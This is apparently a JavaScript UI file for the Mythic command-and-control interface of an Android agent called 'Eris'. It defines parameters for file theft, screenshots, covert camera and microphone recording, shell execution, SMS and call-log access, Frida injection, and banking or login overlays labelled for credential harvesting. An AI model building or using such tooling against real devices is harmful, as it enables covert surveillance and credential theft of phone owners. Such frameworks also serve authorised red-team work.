/**
 * Eris Android Agent - Browser Scripts for Command Interface
 * Provides parameter definitions and UI components for Mythic web interface
 */

// File System Commands
export function ls_params() {
    return {
        "path": {
            "name": "path",
            "description": "Directory path to list",
            "type": "String",
            "required": false,
            "default_value": "."
        },
        "show_hidden": {
            "name": "show_hidden", 
            "description": "Show hidden files",
            "type": "Boolean",
            "required": false,
            "default_value": false
        }
    };
}

export function download_params() {
    return {
        "path": {
            "name": "path",
            "description": "File path to download",
            "type": "String", 
            "required": true
        },
        "chunk_size": {
            "name": "chunk_size",
            "description": "Download chunk size in bytes",
            "type": "Number",
            "required": false,
            "default_value": 1024000
        }
    };
}

export function upload_params() {
    return {
        "remote_path": {
            "name": "remote_path",
            "description": "Remote file path",
            "type": "String",
            "required": true
        },
        "file_data": {
            "name": "file_data",
            "description": "Base64 encoded file data",
            "type": "String",
            "required": true
        },
        "permissions": {
            "name": "permissions",
            "description": "File permissions (octal)",
            "type": "String",
            "required": false,
            "default_value": "644"
        }
    };
}

// Surveillance Commands
export function screenshot_params() {
    return {
        "quality": {
            "name": "quality",
            "description": "Image quality (1-100)",
            "type": "Number",
            "required": false,
            "default_value": 80,
            "min": 1,
            "max": 100
        },
        "format": {
            "name": "format",
            "description": "Image format",
            "type": "ChooseOne",
            "required": false,
            "default_value": "png",
            "choices": ["png", "jpg", "webp"]
        },
        "display_id": {
            "name": "display_id", 
            "description": "Display ID for multi-screen devices",
            "type": "Number",
            "required": false,
            "default_value": 0,
            "min": 0
        }
    };
}

export function camera_params() {
    return {
        "camera_id": {
            "name": "camera_id",
            "description": "Camera ID (0=back, 1=front)",
            "type": "Number",
            "required": false,
            "default_value": 0,
            "choices": [0, 1]
        },
        "quality": {
            "name": "quality",
            "description": "Photo quality (1-100)",
            "type": "Number", 
            "required": false,
            "default_value": 80,
            "min": 1,
            "max": 100
        },
        "flash": {
            "name": "flash",
            "description": "Use camera flash",
            "type": "Boolean",
            "required": false,
            "default_value": false
        }
    };
}

export function microphone_params() {
    return {
        "duration": {
            "name": "duration",
            "description": "Recording duration in seconds",
            "type": "Number",
            "required": false,
            "default_value": 10,
            "min": 1,
            "max": 300
        },
        "quality": {
            "name": "quality",
            "description": "Audio quality",
            "type": "ChooseOne",
            "required": false,
            "default_value": "high",
            "choices": ["low", "medium", "high"]
        }
    };
}

// System Commands
export function shell_params() {
    return {
        "command": {
            "name": "command",
            "description": "Shell command to execute",
            "type": "String",
            "required": true
        },
        "timeout": {
            "name": "timeout",
            "description": "Command timeout in seconds",
            "type": "Number",
            "required": false,
            "default_value": 30,
            "min": 1,
            "max": 300
        }
    };
}

// Communication Commands
export function sms_params() {
    return {
        "action": {
            "name": "action",
            "description": "SMS action to perform",
            "type": "ChooseOne",
            "required": false,
            "default_value": "list",
            "choices": ["list", "send", "delete"]
        },
        "limit": {
            "name": "limit",
            "description": "Maximum number of messages to retrieve",
            "type": "Number",
            "required": false,
            "default_value": 100,
            "min": 1,
            "max": 1000
        },
        "phone_number": {
            "name": "phone_number",
            "description": "Phone number (for send action)",
            "type": "String",
            "required": false
        },
        "message": {
            "name": "message",
            "description": "Message text (for send action)",
            "type": "String",
            "required": false
        }
    };
}

export function call_log_params() {
    return {
        "limit": {
            "name": "limit",
            "description": "Maximum number of call logs to retrieve",
            "type": "Number",
            "required": false,
            "default_value": 100,
            "min": 1,
            "max": 1000
        },
        "call_type": {
            "name": "call_type",
            "description": "Type of calls to retrieve",
            "type": "ChooseOne",
            "required": false,
            "default_value": "all",
            "choices": ["all", "incoming", "outgoing", "missed"]
        }
    };
}

// Advanced Commands
export function frida_params() {
    return {
        "script": {
            "name": "script",
            "description": "Frida JavaScript code to execute",
            "type": "String",
            "required": true
        },
        "target_process": {
            "name": "target_process",
            "description": "Target process name or PID",
            "type": "String",
            "required": false
        }
    };
}

export function overlay_params() {
    return {
        "type": {
            "name": "type",
            "description": "Overlay type",
            "type": "ChooseOne",
            "required": false,
            "default_value": "login",
            "choices": ["login", "banking", "social", "custom"]
        },
        "target_app": {
            "name": "target_app",
            "description": "Target application package name",
            "type": "String",
            "required": false
        },
        "html_content": {
            "name": "html_content",
            "description": "Custom HTML content for overlay",
            "type": "String",
            "required": false
        }
    };
}

// Command Help Text
export const command_help = {
    "ls": "List directory contents with optional path and hidden file display",
    "download": "Download a file from the device to the Mythic server",
    "upload": "Upload a file from the Mythic server to the device", 
    "screenshot": "Take a screenshot of the device screen",
    "camera": "Capture a photo using device camera",
    "microphone": "Record audio using device microphone",
    "shell": "Execute a shell command on the device",
    "sms": "Access SMS messages - list, send, or delete",
    "call_log": "Retrieve call log history from the device",
    "frida": "Execute Frida JavaScript code for runtime manipulation",
    "overlay": "Create overlay windows for credential harvesting"
};

// Command Categories for UI Organization
export const command_categories = {
    "File System": ["ls", "download", "upload"],
    "Surveillance": ["screenshot", "camera", "microphone"],
    "System": ["shell"],
    "Communication": ["sms", "call_log"],
    "Advanced": ["frida", "overlay"]
};

// UI Helpers
export function create_command_interface(command_name, parameters) {
    const container = document.createElement('div');
    container.className = 'command-interface';
    
    // Command title
    const title = document.createElement('h3');
    title.textContent = `${command_name.toUpperCase()} Command`;
    container.appendChild(title);
    
    // Help text
    if (command_help[command_name]) {
        const help = document.createElement('p');
        help.className = 'command-help';
        help.textContent = command_help[command_name];
        container.appendChild(help);
    }
    
    // Parameter inputs
    const form = document.createElement('form');
    form.className = 'command-form';
    
    Object.keys(parameters).forEach(param_name => {
        const param = parameters[param_name];
        const field_group = document.createElement('div');
        field_group.className = 'form-group';
        
        // Label
        const label = document.createElement('label');
        label.textContent = `${param.name}${param.required ? ' *' : ''}`;
        label.setAttribute('for', param.name);
        field_group.appendChild(label);
        
        // Input
        let input;
        switch (param.type) {
            case 'Boolean':
                input = document.createElement('input');
                input.type = 'checkbox';
                input.checked = param.default_value;
                break;
            case 'Number':
                input = document.createElement('input');
                input.type = 'number';
                input.value = param.default_value;
                if (param.min !== undefined) input.min = param.min;
                if (param.max !== undefined) input.max = param.max;
                break;
            case 'ChooseOne':
                input = document.createElement('select');
                param.choices.forEach(choice => {
                    const option = document.createElement('option');
                    option.value = choice;
                    option.textContent = choice;
                    if (choice === param.default_value) option.selected = true;
                    input.appendChild(option);
                });
                break;
            default:
                input = document.createElement('input');
                input.type = 'text';
                input.value = param.default_value || '';
        }
        
        input.id = param.name;
        input.name = param.name;
        if (param.required) input.required = true;
        
        field_group.appendChild(input);
        
        // Description
        if (param.description) {
            const desc = document.createElement('small');
            desc.className = 'param-description';
            desc.textContent = param.description;
            field_group.appendChild(desc);
        }
        
        form.appendChild(field_group);
    });
    
    container.appendChild(form);
    return container;
}

// Export all parameter functions
export const parameter_functions = {
    ls: ls_params,
    download: download_params,
    upload: upload_params,
    screenshot: screenshot_params,
    camera: camera_params,
    microphone: microphone_params,
    shell: shell_params,
    sms: sms_params,
    call_log: call_log_params,
    frida: frida_params,
    overlay: overlay_params
};
